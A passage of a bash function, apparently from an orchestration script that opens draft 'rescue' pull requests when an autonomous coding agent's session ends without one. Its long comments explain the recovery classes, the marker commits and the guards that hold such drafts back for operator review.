    #   dispatch-lib staged + committed with wip() + pushed; this opens the PR.
    # - "commit-pushed-no-pr" (mika#1396): pilot committed AND pushed but
    #   gh pr create failed (e.g., AxiosError 5000ms timeout). Branch has the
    #   commit on origin; PR was never opened. dispatch-lib opens it.
    #
    # Runs after _push_branch (lines 558-564) and before _deliver_callback.
    # - "no-shipping-tail" (mika#2492): the pilot's perimeter never included
    #   opening a PR (`/ce-work`), and its session concluded. dispatch-lib opens
    #   the PR because that has been its job since mika#1271 — this is the
    #   NOMINAL path of the autonomous loop, not a wreck, so it carries neither
    #   the RECOVERY_PENDING marker nor the wip(mika#1383) marker commit.
    local RECOVERY_CLASS=""
    if [ "${RESCUED_DIRTY_WORKTREE:-}" = "1" ]; then
        RECOVERY_CLASS="dirty-worktree"
    elif [ -z "$PR_URL" ] && [ -n "$PRE_RUN_HEAD" ] && [ -n "$POST_RUN_HEAD" ] \
         && [ "$PRE_RUN_HEAD" != "$POST_RUN_HEAD" ] && _pilot_had_no_shipping_tail; then
        RECOVERY_CLASS="no-shipping-tail"
    elif [ -z "$PR_URL" ] && [ -n "$PRE_RUN_HEAD" ] && [ -n "$POST_RUN_HEAD" ] \
         && [ "$PRE_RUN_HEAD" != "$POST_RUN_HEAD" ] && [ "$SKILL" = "dev-pilot" ]; then
        RECOVERY_CLASS="commit-pushed-no-pr"
    fi

    # The four conditions that make a recovery PR due, evaluated ONCE. They used
    # to live directly on the opening `if`; mika#2503 needed to insert a refusal
    # ahead of that `if` without either re-indenting its ~120-line body or
    # restating the four terms in two branches, which is a divergence waiting for
    # the first editor who changes one of them.
    local _recovery_pr_due=0
    if [ -n "$RECOVERY_CLASS" ] && [ -n "$REPO" ] && [ -n "$BRANCH" ] && [ -z "$PR_URL" ]; then
        _recovery_pr_due=1
    fi

    # mika#2503: refuse to open a PR whose whole content is pilot scratch — a
    # probe crate and its build artefacts, touching nothing the repo knows about.
    #
    # THE REFUSAL IS HERE, AFTER RECOVERY_CLASS IS COMPUTED, AND THAT PLACEMENT
    # IS THE FIX. Not setting RESCUED_DIRTY_WORKTREE=1 would NOT have been
    # enough: the rescue commit advances POST_RUN_HEAD, so
    # `PRE_RUN_HEAD != POST_RUN_HEAD` becomes true and the `commit-pushed-no-pr`
    # branch above opens the PR anyway. A fix placed at the flag site alone would
    # pass every local test and change NOTHING in production. Clearing
    # `_recovery_pr_due` covers all THREE classes by construction — which is also
    # the right perimeter, the predicate being about content and never about class.
    #
    # NOTHING IS DESTROYED BY THIS REFUSAL, and that is what makes it safe to put
    # on the nominal gate: the `wip()` commit is made, POST_RUN_HEAD is advanced,
    # `_push_branch` has already published the branch. Only the draft PR is
    # withheld, and the operator opens it with one command (named in RESULT).
    # Contrast the staging half in `.gitignore`, which is destructive in practice
    # and is therefore reserved to what is certainly regenerable — a cargo
    # `target/`.
    if [ "$_recovery_pr_due" = "1" ] && ! _rescue_touches_tracked_tree "$WORKTREE_DIR"; then
        _recovery_pr_due=0
        # The operator surface is RESULT — the callback body, which lands in
        # `tasks.result` — never a log line. Unit 2 runs at
        # `dispatch_claude_pilot` level, in the same regime as
        # `_check_pilot_force_push`: its stderr is `spawn_long_running_exec`'s
        # `Stdio::piped()` handle, which the executor reads ONLY inside
        # `if !status.success()`. On a dispatch that succeeds the pipe is dropped
        # unread — that is Signal M, and the mika#2050 class corrected three
        # times over on Signal S. So no grep is announced for this refusal; the
        # `echo` below is a convenience, deliberately NOT presented as a probe.
        echo "rescue_scratch_refused: content touches no tracked top-level directory — draft PR withheld (branch=$BRANCH, mika#2503)" >&2
        # The prose goes on its own lines, and the canonical status line through
        # `_set_pr_status_line` (mika#2121). Both halves are load-bearing: that
        # helper strips any prior `PR:`/`NO_PR:` so the delivered callback carries
        # EXACTLY ONE status line — site 2 in `_post_flight_recovery` has already
        # written one by the time we get here — and the reason must be a bare
        # snake_case token because the consumer is strict:
        # `dispatcher.rs::RE_NO_PR` is `(?m)^NO_PR:\s+([a-z_]+)`, declared class B
        # in `scripts/canonical-tokens.tsv`. Prose on that line would have had the
        # parser record the reason as the first lowercase word of the sentence.
        RESULT="${RESULT}
Draft PR withheld (mika#2503): the rescued content touches no top-level directory this repo tracks, so it is pilot scratch (a probe crate and/or its build artefacts) rather than an implementation.
Nothing was lost — the commit exists and branch ${BRANCH} is pushed.
To publish it anyway: gh pr create --repo senara-solutions/${REPO} --head ${BRANCH} --base main --draft"
        _set_pr_status_line "NO_PR: rescue_scratch_only"
    fi

    if [ "$_recovery_pr_due" = "1" ]; then
        # Recovery-class-specific PR title + unified body template (mika#1618)
        local _rescue_title
        local _rescue_class_fact
        if [ "$RECOVERY_CLASS" = "dirty-worktree" ]; then
            _rescue_title=$(_derive_recovery_pr_title "dirty-worktree" "$WORKTREE_DIR" "$REPO" "$ISSUE_NUM" "$LABELS" "$ISSUE_TITLE")
            _rescue_class_fact="The pilot session wrote file changes but never committed. dispatch-lib auto-committed with \`wip()\` prefix."
        elif [ "$RECOVERY_CLASS" = "no-shipping-tail" ]; then
            # mika#2492: the truth of this class, and it is not a wreck. The
            # title comes from the pilot's real head commit, exactly as for
            # commit-pushed-no-pr — both classes share the topology "the pilot
            # committed", they differ only on whether that was its whole job.
            _rescue_title=$(_derive_recovery_pr_title "no-shipping-tail" "$WORKTREE_DIR" "$REPO" "$ISSUE_NUM" "$LABELS" "$ISSUE_TITLE")
            _rescue_class_fact="The pilot ran under \`/ce-work <plan>\` (mika#1074 plan-on-branch override), whose perimeter is implementation and local verification only — without the shipping tail. It committed the plan's work and concluded; opening the PR is dispatch-lib's job (mika#1271), not a step it truncated before. This PR is draft because its review has not happened yet — never because its content is in doubt."
        else
            _rescue_title=$(_derive_recovery_pr_title "commit-pushed-no-pr" "$WORKTREE_DIR" "$REPO" "$ISSUE_NUM" "$LABELS" "$ISSUE_TITLE")
            _rescue_class_fact="The pilot session committed and pushed but did not open a PR (\`gh pr create\` failed, or the pilot ended its turn before invoking it — mika#1383). dispatch-lib opened this PR from the existing branch."
        fi

        # mika#1679 (Edit 2, mika-arch-ratified Option a, session 2d397bee): for
        # the commit-pushed-no-pr class, add an empty wip(mika#1383) marker commit
        # so the PR's head-commit headline matches Guard 2's `^wip\(` regex
        # (self-dev-webhook-qa `isDraft AND ^wip\(` conjunction). The pilot's own
        # head commit is a conventional `fix(/feat(` subject, so without this Guard
        # 2 would not fire — though Guard 1 (RECOVERY_PENDING marker) and qa-review
        # Step 1.5 (rescue header) still would. The PR *title* is already derived
        # above from the pilot's real head commit, so this marker does not change
        # the title — only the head-commit headline Guard 2 inspects. The
        # dirty-worktree class is already wip()-prefixed by its mika#1282 rescue
        # commit, so it is excluded here (no second empty commit).
        #
        # Idempotent (no marker stacking on re-dispatch): skip the commit when HEAD
        # is already a wip(mika#1383) marker, but still (re-)push so a marker from a
        # prior attempt whose push failed reaches origin. Push failure is surfaced,
        # not silently swallowed: `gh pr create` below opens the PR from the ORIGIN
        # branch, so an unpushed marker means the PR head won't match `^wip\(` and
        # Guard 2 won't arm. The rescue still proceeds — Guard 1 (RECOVERY_PENDING)
        # and qa-review Step 1.5 (rescue header) hold the draft regardless — but the
        # operator/telemetry must see that the Guard-2 belt is missing.
        if [ "$RECOVERY_CLASS" = "commit-pushed-no-pr" ]; then
            _marker_at_head=1
            if printf '%s' "$(git -C "$WORKTREE_DIR" log -1 --format='%s' 2>/dev/null)" \
                | grep -qF 'wip(mika#1383): auto-PR-create rescue'; then
                echo "rescue_marker.skip_commit: head already a wip(mika#1383) marker (branch=$BRANCH)" >&2
            elif ! git -C "$WORKTREE_DIR" commit --allow-empty --no-verify -m "wip(mika#1383): auto-PR-create rescue for ${REPO}#${ISSUE_NUM}

The pilot committed and pushed but did not reach gh pr create before its turn
ended. dispatch-lib's mika#1396 rescue opened the draft PR. This empty marker
commit signals the rescue class so the qa-webhook wip-rescue draft guard fires.
The pilot's implementation work is in the commit(s) below this one." 2>&9; then
                _marker_at_head=0
                echo "rescue_marker.commit_failed: could not create wip(mika#1383) marker (branch=$BRANCH) — Guard 2 not armed; rescue proceeds on Guard 1 + qa-review Step 1.5" >&2
            fi
            if [ "$_marker_at_head" = "1" ] && ! git -C "$WORKTREE_DIR" push origin "$BRANCH" 2>&9; then
                echo "rescue_marker_push.failed: Guard 2 not armed — wip(mika#1383) marker did not reach origin (branch=$BRANCH); rescue proceeds on Guard 1 + qa-review Step 1.5" >&2
            fi
        fi

        # mika#2354: give `rescue-pipeline-verified` its producer. Measured
        # HERE — after the rescue commit and after the push, immediately before
        # `gh pr create` — so what is measured is the exact state this PR is
        # about to publish, not an earlier one.
        #
        # The clippy run below deliberately DUPLICATES the one `wip_rescue`
        # performs downstream. The two do not measure the same thing: this one
        # runs before the rebase onto main, that one after, and their
        # consequences differ (a marker on the body vs. an un-draft). Unifying
        # them would mean moving the measurement into a consumer, which AC7
        # refuses — the producer stays dispatch-lib, sole writer of its own
        # green light.
        local _rescue_verified="no" _rescue_verify_term="" _rescue_verify_excerpt=""
        if _rescue_verify_enabled; then
            local _rescue_verify_out=""
            if _rescue_verify_out=$(_measure_pipeline_verified "$WORKTREE_DIR"); then
                _rescue_verified="yes"
            else
                _rescue_verify_term=$(head -1 <<<"$_rescue_verify_out")
                _rescue_verify_excerpt=$(tail -n +2 <<<"$_rescue_verify_out")
            fi
            echo "rescue_pipeline_verified: verified=${_rescue_verified} term=${_rescue_verify_term:-none} (mika#2354)" >&2
        else
            echo "rescue_pipeline_verified: disabled by MIKA_RESCUE_VERIFY_ENABLED — marker stays 'no', body unchanged (mika#2354)" >&2
        fi

        RESCUED_PR_URL=$(gh pr create \
            --repo "senara-solutions/$REPO" \
            --head "$BRANCH" \
            --base main \
            --draft \
            --title "$_rescue_title" \
            --body "$(_compose_rescue_pr_body "$WORKTREE_DIR" "$RECOVERY_CLASS" "$_rescue_class_fact" "$ISSUE_NUM" "$_rescue_verified" "$_rescue_verify_term" "$_rescue_verify_excerpt")" 2>&9 || true)

        if [ -n "$RESCUED_PR_URL" ]; then
            PR_URL="$RESCUED_PR_URL"
            # mika#2026: this PR was opened by dispatch-lib itself — the most
            # direct producer there is. Stamp origin on the artefact. Fail-open.
            _stamp_pr_origin "$REPO" "$RESCUED_PR_URL" loop || true
            # mika#1631: tag rescued PRs for staleness-probe targeting
            gh pr edit "$RESCUED_PR_URL" --add-label "wip-rescue" 2>&9 || true
            # mika#2121 (U1): the rescue opened a real PR, so drop the site-2
            # `NO_PR:` line first — the total-output contract allows exactly one
            # PR-status line, and `PR:` is now the true one.
            RESULT="$(printf '%s' "$RESULT" | sed '/^PR: /d; /^NO_PR: /d')"
            # mika#1352: emit canonical `PR:` line alongside the descriptive
            # `Draft PR (dispatch-lib recovery):` line. mika-dev's callback
            # parser (dispatcher.rs) matches line-anchored `^PR: ` —
            # without this, claude_pilot.pr_url is never written and the
            # parent task false-fails as `callback_delivered_without_pr_url`
            # despite the rescued PR being open and reviewable. See mika#871
            # R4 for the canonical contract.
            if [ "$RECOVERY_CLASS" = "no-shipping-tail" ]; then
                # mika#2492: the nominal path. No `RECOVERY_PENDING: true` —
                # that marker is what makes self-dev-callback write
                # `unpushed_recovery_pending` into tasks.metadata, which makes
                # the qa-webhook Guard 1 skip the autonomous review and escalate
                # to the operator. A pilot that did exactly what its perimeter
                # asked has nothing pending.
                RESULT="${RESULT}
Draft PR (opened by dispatch-lib): ${PR_URL}
PR: ${PR_URL}"
                # The `Outcome:` posed inside _post_flight_recovery named this
                # very window ("did not reach PR creation"); it is now false, and
                # the sister of _set_pr_status_line replaces it in one line so
                # the one-Outcome-line contract holds by construction.
                _set_outcome_line "Outcome: PR_OPENED — ${PR_URL}"
            else
                RESULT="${RESULT}
Draft PR (dispatch-lib recovery): ${PR_URL}
PR: ${PR_URL}
RECOVERY_PENDING: true"
            fi
            # mika#1613: structured marker parsed by self-dev-callback, which
            # writes `unpushed_recovery_pending: true` into tasks.metadata. That
            # flag makes the qa-webhook recovery-skip guard fire so this rescue
            # draft PR is NOT autonomously un-drafted + auto-merged. Both recovery
            # classes (dirty-worktree mika#1282, commit-pushed-no-pr mika#1396)
            # flow through this block, so a single marker covers both. Guarded by
            # `if [ -n "$RESCUED_PR_URL" ]` — only emitted when a rescue PR opened.
        else
            # mika#2121 (U1): the rescue `gh pr create` failed (empty
            # RESCUED_PR_URL). Its silence means "the rescue PR could not be
            # created", NOT "no PR on the branch" — a fifth reason distinct from
            # the site-1/2 `gh pr list` set (KTD2). Name it so the reaper writes
            # `callback_no_pr_rescue_pr_create_failed` instead of the generic
            # motif. This supersedes the `NO_PR: no_pr_on_branch` site 2 emitted.
            # The gh stderr already went to the trace fd (2>&9), so it is not
            # swallowed.
            #
            # mika#2151 (the third silence): `gh pr create` fails with "a pull
            # request for branch … already exists" whenever the rescue landed on
            # a branch that already carries an open PR. That failure IS the proof
            # the rescued content entered a PR someone may already have reviewed,
            # and spending it on the generic create-failed motif throws the proof
            # away — misreporting "no PR" for a dispatch that demonstrably has
            # one. Ask which of the two it was, and report accordingly.
            local _existing_pr
            _existing_pr=$(_pr_list_url "$REPO" "$BRANCH")
            if [ -n "$_existing_pr" ]; then
                echo "rescue_pr_create.pr_already_open: branch=${BRANCH} pr=${_existing_pr} — the rescued content entered a PR opened before this dispatch" >&2
                PR_URL="$_existing_pr"
                _set_pr_status_line "PR: ${_existing_pr}"
                RESULT="${RESULT}
Rescue-into-open-PR (mika#2151): no rescue PR was opened because ${_existing_pr} was already open on ${BRANCH}. The rescued commits went into THAT PR — see the notice posted on it."
                # Deliberately no `RECOVERY_PENDING: true` here. That marker
                # holds back a draft PR dispatch-lib itself opened; this PR is
                # someone else's, already in the normal review flow. The brakes
                # for this case are mika#2151's comment, label and dismissal.
            else
                _set_pr_status_line "NO_PR: rescue_pr_create_failed"
            fi
        fi
    fi

    _deliver_callback
}
